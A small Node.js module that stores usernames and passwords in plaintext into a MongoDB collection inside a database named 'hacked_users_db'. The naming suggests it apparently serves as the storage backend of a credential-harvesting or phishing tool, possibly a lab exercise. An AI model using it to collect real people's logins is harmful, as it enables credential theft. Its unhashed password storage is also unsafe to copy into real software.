const mongodb=require("mongodb")

const uri = process.env.MONGO_URI
const client = new mongodb.MongoClient(uri)
const infoCollection = client.db("hacked_users_db").collection("user_info")


const add_info = (user, password) => {
    infoCollection.insertOne({
        user: user,
        password: password
    })
}

module.exports = {
    add_info
}
